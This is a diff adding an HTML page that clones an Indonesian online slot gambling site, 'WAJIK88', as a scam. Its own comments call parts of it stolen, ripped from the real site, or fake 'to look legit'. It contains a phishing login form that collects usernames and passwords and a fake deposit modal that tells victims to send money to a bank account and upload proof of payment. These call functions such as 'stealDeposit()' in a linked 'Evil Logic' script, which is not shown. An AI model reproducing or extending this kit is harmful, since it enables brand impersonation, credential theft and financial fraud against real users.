@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="theme-color" content="#e5c300">
+    <title>WAJIK88: Situs Slot Online Terpercaya</title>
+    <!-- Favicon (stolen) -->
+    <link rel="icon" type="image/png" href="assets/images/favicon.png">
+    <!-- Font Awesome (for icons) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- Custom CSS (ripped from Wajik88) -->
+    <link rel="stylesheet" href="css/style.css">
+    <!-- Fake Google Analytics (to look legit) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-XXXXXXXXXX');
+    </script>
+    <!-- Fake Meta Pixel (to look legit) -->
+    <script>
+        !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '1234567890');
+    </script>
+</head>
+<body>
+    <!-- Fake Header (Stolen from Wajik88) -->
+    <header class="header">
+        <div class="header__mid">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-3">
+                        <div class="header-logo">
+                            <a href="index.html">
+                                <img src="assets/images/logo.png" alt="WAJIK88" width="250" height="54">
+                            </a>
+                        </div>
+                    </div>
+                    <div class="col-lg-9">
+                        <div class="header-user">
+                            <span class="mr-1">Hi, </span>
+                            <div class="user-account">
+                                <img src="assets/images/new-player.svg" alt="New Player">
+                                <span class="username" id="fake-username">Guest</span>
+                                <div class="account-status">
+                                    <div class="status-title">Status: <a href="#">New Player</a></div>
+                                </div>
+                            </div>
+                            <div class="user-wallet ml-1">
+                                <span>| TOTAL SALDO:</span>
+                                <a href="#" id="fake-refresh"><i class="fa fa-sync"></i></a>
+                                <a class="wallet-amount" id="fake-balance">IDR <span>10.000.000</span></a>
+                            </div>
+                        </div>
+                        <div class="header-form mb-2">
+                            <a class="btn-memo" href="#">Memo</a>
+                            <a class="btn-profil" href="#">Profil</a>
+                            <a class="btn-transaksi" href="#">Transaksi</a>
+                            <a class="btn-bonus" href="#">Bonus</a>
+                            <a class="btn-signout" href="#" id="fake-logout">Keluar</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Fake Slot Game Section -->
+    <div class="container mt-4">
+        <h2 class="text-center">🎰 SLOT GAMES 🎰</h2>
+        <div class="row" id="slot-games">
+            <!-- Fake Slot Game 1 -->
+            <div class="col-lg-3 col-md-4 col-sm-6 mb-4">
+                <div class="game-card" onclick="loadFakeSlot('gates-of-olympus')">
+                    <img src="assets/images/gates-of-olympus.jpg" alt="Gates of Olympus" class="game-thumbnail">
+                    <h4>Gates of Olympus</h4>
+                    <button class="btn-play">MAINKAN</button>
+                </div>
+            </div>
+            <!-- Fake Slot Game 2 -->
+            <div class="col-lg-3 col-md-4 col-sm-6 mb-4">
+                <div class="game-card" onclick="loadFakeSlot('sweet-bonanza')">
+                    <img src="assets/images/sweet-bonanza.jpg" alt="Sweet Bonanza" class="game-thumbnail">
+                    <h4>Sweet Bonanza</h4>
+                    <button class="btn-play">MAINKAN</button>
+                </div>
+            </div>
+            <!-- Add more fake games here -->
+        </div>
+    </div>
+
+    <!-- Fake Footer -->
+    <footer class="footer">
+        <div class="container text-center">
+            <p>© 2023 WAJIK88. All rights reserved. (Not really, this is a scam.)</p>
+        </div>
+    </footer>
+
+    <!-- Fake Login/Deposit Modal (Phishing) -->
+    <div class="modal fade" id="fakeLoginModal" tabindex="-1" role="dialog">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Login to Play</h5>
+                    <button type="button" class="close" data-dismiss="modal">
+                        <span>&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <form id="fake-login-form">
+                        <div class="form-group">
+                            <label>Username</label>
+                            <input type="text" class="form-control" id="phish-username" placeholder="Enter username">
+                        </div>
+                        <div class="form-group">
+                            <label>Password</label>
+                            <input type="password" class="form-control" id="phish-password" placeholder="Enter password">
+                        </div>
+                        <button type="submit" class="btn btn-primary">Login</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Fake Deposit Modal (Steal Money) -->
+    <div class="modal fade" id="fakeDepositModal" tabindex="-1" role="dialog">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Deposit Required</h5>
+                    <button type="button" class="close" data-dismiss="modal">
+                        <span>&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <p>You need to deposit to play. Send money to:</p>
+                    <p><strong>Bank: BCA</strong></p>
+                    <p><strong>Account: 1234567890</strong></p>
+                    <p><strong>Name: PT. WAJIK SCAM INDONESIA</strong></p>
+                    <div class="form-group">
+                        <label>Upload Proof of Payment</label>
+                        <input type="file" class="form-control" id="phish-proof">
+                    </div>
+                    <button class="btn btn-success" onclick="stealDeposit()">Confirm Deposit</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- jQuery (for modals) -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- Bootstrap JS (for modals) -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <!-- Custom JS (Evil Logic) -->
+    <script src="js/script.js"></script>
+</body>
+</html>
